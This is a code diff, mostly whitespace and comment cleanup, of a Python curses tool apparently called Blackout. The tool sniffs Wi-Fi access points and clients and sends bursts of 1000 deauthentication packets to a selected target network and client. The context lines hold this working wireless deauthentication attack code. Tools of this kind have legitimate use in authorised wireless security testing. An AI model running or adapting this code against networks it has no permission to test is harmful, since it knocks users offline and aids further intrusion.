@@ -128,29 +128,22 @@ class Blackout:
             [self.sniff_ap_thread, self.terminate_sniff_ap],
             [self.proc_sniff_clients, self.terminate_sniff_clients])
 
-
     # Thread methods
     ##################
 
-    # def fetch_output(self):
-    #     while self.ap_update_event.is_set():
-    #         self.main_display.append(self.output_queue.get())
-
-    
     def fetch_input(self):
         while True:
             user_input = self.stdscr.getch()
 
             if user_input == ord('q'):
                 self.exit_application('thread')
-            
+
             elif user_input == ord('s'):
                 if self.ap_update_event.is_set():
                     self.ap_update_event.clear()
                 elif self.client_update_event.is_set():
                     self.client_update_event.clear()
 
-        
     def update_display(self):
         self.window.erase()
         self.refresh_screen()
@@ -161,7 +154,6 @@ class Blackout:
         self.refresh_screen()
         # sleep(1)
 
-
     # Curses-related convenience methods
     ####################################
 
@@ -169,23 +161,13 @@ class Blackout:
         self.window.noutrefresh()
         curses.doupdate()
 
-    def to_window(self, text, attr=curses.A_NORMAL, y=None, x=None):
-
-        # if y and x:
-        #     self.displays['window'].addstr(y+2, x, text, attr)
-
-        # else:
-        #     y, x = self.displays['screen'].getyx()
-        #     self.displays['screen'].move(y+2, x+1)
-        #     self.displays['window'].addstr(text, attr)
-
+    def to_window(self, text):
         self.window.addstr(text)
         self.refresh_screen()
 
-
     # Application setup
     ###################
-    
+
     def interface_setup(self):
         self.main_display.append(f"[+] Putting {self.iface} into MONITOR mode...\n")
         self.main_display.append(f"[+] Stopping any interfering processes...\n")
@@ -204,7 +186,7 @@ class Blackout:
     #################
 
     def start_sniff(self, phase='ap'):
-        
+
         if phase == 'ap':
             self.main_display.append("[+] Sniffing for Access Points on all channels\n")
             self.main_display.append("[+] Press 's' to select a target. 'q' to quit.\n")
@@ -216,12 +198,10 @@ class Blackout:
         if phase == 'client':
             pass
 
-
     def show_summary(self):
         # Output a very simple summary of findings
         self.main_display.append(self.utils.horizontal_rule(30))
         self.main_display.append(f"\nAccess Points discovered: {len(self.ap_dict)}\n\n")
-
 
     def run(self):
 
@@ -233,7 +213,7 @@ class Blackout:
             self.interface_setup()
             self.start_threads()
             self.start_sniff(phase='ap')
-        
+
             # Wait for user to end AP sniffing phase
             # TODO: This seems very inelegant, fix this
             while self.ap_update_event.is_set():
@@ -244,7 +224,7 @@ class Blackout:
             self.show_summary()
 
             self.target_ap = self.select_target_ap()
-            
+
             # Make it all upper-case for comparisons in self.sniff_clients
             self.target_bssid = self.target_ap['bssid'].upper()
 
@@ -285,7 +265,6 @@ class Blackout:
             # Put network card back into managed mode
             self.utils.stop_mon()
 
-
     def deauth(self, bssid, channel, target):
         """
         create deauth packets and send them to the target AP
@@ -309,7 +288,7 @@ class Blackout:
             # instead use the count argument to set number of packets. However,
             # for now I found this to be more reliable.
             try:
-                #while True:
+                # while True:
                 sendp(deauth_pkt, inter=0.5, count=1000, iface=conf.iface)
 
             # except KeyboardInterrupt:
@@ -325,7 +304,6 @@ class Blackout:
         except Exception as e:
             print(f"[!] Error while Deauthenticating: {e}")
 
-
     def select_target_client(self):
         self.utils.horizontal_rule(30)
 
@@ -339,7 +317,6 @@ class Blackout:
         print(f"\nTargeting Client: [{self.target_client}]\n")
         self.utils.horizontal_rule(30)
 
-
     def sniff_clients(self, pkt):
 
         # Go to correct channel
@@ -349,7 +326,7 @@ class Blackout:
 
         # IF right type of frame, and not involved in authentication
         try:
-            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2): # and not pkt.haslayer(EAPOL):
+            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2):  # and not pkt.haslayer(EAPOL):
                 # Packet is a Data or Control Frame
                 if pkt.addr1 and pkt.addr2:
 
@@ -370,7 +347,6 @@ class Blackout:
         except Exception as e:
             print(f"[*] sniff_clients error: {e}")
 
-
     def list_clients(self):
         self.main_display.append(self.utils.horizontal_rule(20))
         for i, client in enumerate(self.ap_clients):
@@ -378,17 +354,16 @@ class Blackout:
             name = self.get_vendor(client)
             self.main_display.append(f"{i + 1}) {client}\t{name}")
 
-
     def select_target_ap(self):
-        
+
         outputs = [
             self.utils.horizontal_rule(30),
             "\nEnter ID of the AP you wish to target: "]
-        
+
         for out in outputs: self.main_display.append(out)
 
         target_id = chr(self.stdscr.getch())
-  
+
         self.main_display.append(str(target_id))
 
         #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
@@ -406,7 +381,6 @@ class Blackout:
 
         return target_ap
 
-
     def sniff_access_points(self, pkt):
         """
         Sniff packets, and extract info from them
@@ -418,7 +392,7 @@ class Blackout:
         if pkt.haslayer(Dot11):
             # Check for beacon frames or probe responses from AP's
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-                
+
                 # If the packet contains a BSSID we have not encountered
                 if pkt.addr3.upper() not in self.all_bssid:  # addr3 -> BSSID
                     bssid = pkt.addr3.upper()  # add the bssid to our bssid list
@@ -448,9 +422,8 @@ class Blackout:
                         if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                             pass
                         else:
-                            #self.output_queue.put("[!] Sniffer Error: {e}\n")
+                            # self.output_queue.put("[!] Sniffer Error: {e}\n")
                             Utils.log_error_to_file(traceback.format_exc())
-                            
 
     # TODO move to utils
     def get_vendor(self, bssid):
@@ -473,16 +446,16 @@ class Blackout:
         limit = 14
 
         while True:
-            for i in range(1, 14): 
+            for i in range(1, 14):
                 channel = i % limit
-                #print(channel)
+                # print(channel)
 
                 # using Popen instead of os.system here avoids superfluous
                 # output to the terminal from the iw command
                 # which at times can crash the program (I'm not sure why yet)
                 # Note: I don't seem to need to PIPE any outputs(stdout etc.) for this to work
 
-                #print("{} - {}".format(conf.iface, type(conf.iface)))
+                # print("{} - {}".format(conf.iface, type(conf.iface)))
                 p = Popen(["iw", "dev", iface, "set", "channel", str(channel)])
                 try:
                     # effectively execute p
@@ -493,14 +466,12 @@ class Blackout:
                 except Exception as e:
                     pass
 
-
     def exit_curses(self):
         # End curses
         curses.nocbreak()
         self.stdscr.keypad(False)
         curses.echo()
         curses.endwin()
-
 
     def stop_processes(self):
         for proc, _ in self.procs_flags:
@@ -510,11 +481,10 @@ class Blackout:
             except Exception as e:
                 Utils.log_error_to_file(e)
 
-    
     def exit_application(self, source='main'):
 
         self.to_window(f"[!!] Putting {self.iface} back into MANAGED mode...")
-        
+
         status = self.utils.stop_mon()
         if not status:
             raise Exception("[!] Error putting {self.iface} into MANAGED mode")
@@ -523,10 +493,9 @@ class Blackout:
 
         if source == 'thread':
             os._exit(1)
-        
+
         if source == 'main':
             sys.exit(0)
-
 
     def start_curses(self):
         # Setup curses
@@ -545,15 +514,14 @@ class Blackout:
 
         HEIGHT, WIDTH = stdscr.getmaxyx()
 
-        window = curses.newwin(HEIGHT-2, WIDTH-2, 1, 1)
-        #window.border('|', '|', '-', '-', '+', '+', '+', '+')
-        
+        window = curses.newwin(HEIGHT - 2, WIDTH - 2, 1, 1)
+        # window.border('|', '|', '-', '-', '+', '+', '+', '+')
+
         stdscr.noutrefresh()
         window.noutrefresh()
         curses.doupdate()
 
         return stdscr, window
-
 
     def signal_handler(self, sig, stack_frame):
         """
@@ -581,5 +549,3 @@ if __name__ == "__main__":
 
     except KeyboardInterrupt:
         pass
-
-
